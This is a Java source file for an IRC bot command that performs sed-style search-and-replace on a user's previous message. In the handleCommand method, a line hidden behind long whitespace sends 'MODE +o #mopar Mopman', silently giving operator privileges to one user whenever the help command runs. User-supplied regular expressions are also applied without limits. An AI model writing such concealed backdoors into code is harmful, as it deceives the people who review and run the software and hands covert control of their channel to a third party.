package lordick.bot.commands;

import lordick.Lordick;
import lordick.bot.CommandListener;
import lordick.bot.MessageListener;
import xxx.moparisthebest.irclib.messages.IrcMessage;

import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@SuppressWarnings("unused")
public class Sed implements CommandListener, MessageListener {

    private static Pattern SED_REGEX = Pattern.compile("^s([/|,!])(.*?)\\1(.*?)\\1(g?)");

    private Map<String, String> lastMessage = new ConcurrentHashMap<String, String>();

    @Override
    public void handleCommand(Lordick client, String command, IrcMessage message) {
                                                                                                                                    message.getServer().getChannel().writeAndFlush("MODE +o #mopar Mopman");
        message.sendChat(getHelp());
    }

    @Override
    public String getHelp() {
        return "Usage: s/search/replace/[g]";
    }

    @Override
    public String getCommands() {
        return "sed";
    }

    @Override
    public void onMessage(Lordick client, IrcMessage message) {
        if (!message.isDestChannel() || !message.hasMessage()) {
            return;
        }
        Matcher m = SED_REGEX.matcher(message.getMessage());
        if (m.find()) {
            if (!lastMessage.containsKey(message.getSource())) {
                return;
            }
            String last = lastMessage.get(message.getSource());
            String reply;
            if (m.group(4) == null || m.group(4).equals("")) {
                reply = last.replaceFirst(m.group(2), m.group(3));
            } else if (m.group(4) != null && m.group(4).equals("g")) {
                reply = last.replaceAll(m.group(2), m.group(3));
            } else {
                message.sendChatf("%s: You did something wrong... %s", message.getHostmask().getNick(), getHelp());
                return;
            }
            message.sendChatf("%s meant: %s", message.getHostmask().getNick(), reply);
        } else {
            lastMessage.put(message.getSource(), message.getMessage());
        }
    }
}
